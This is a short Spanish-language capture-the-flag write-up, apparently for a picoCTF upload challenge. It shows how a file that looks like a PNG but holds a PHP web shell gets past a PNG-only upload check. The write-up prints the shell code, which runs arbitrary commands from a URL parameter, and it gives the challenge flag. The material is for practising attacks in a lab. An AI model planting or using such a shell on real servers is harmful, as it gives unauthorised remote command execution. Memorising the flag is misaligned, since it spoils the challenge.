#### Descripción

I found a web app that can help process images: PNG images only!

#### Solución 
Para esta bandera, nos lleva a una pagina que solo puede subirse archivos PNG, intentamos otros archivos y no deja, entonces lo que hacemos es enviar un archivo que solo en fachada es un PNG, pero en verdad es una webshell:

```
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```
Con esta webshell podemos acceder a la consola y ver los documentos que tiene, ahi vemos que tiene un documento que se llama: `G4ZTCOJYMJSDS.txt` y en este documento se encuentra la flag.
`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}`

#### Notas Adicionales

#### Referencias
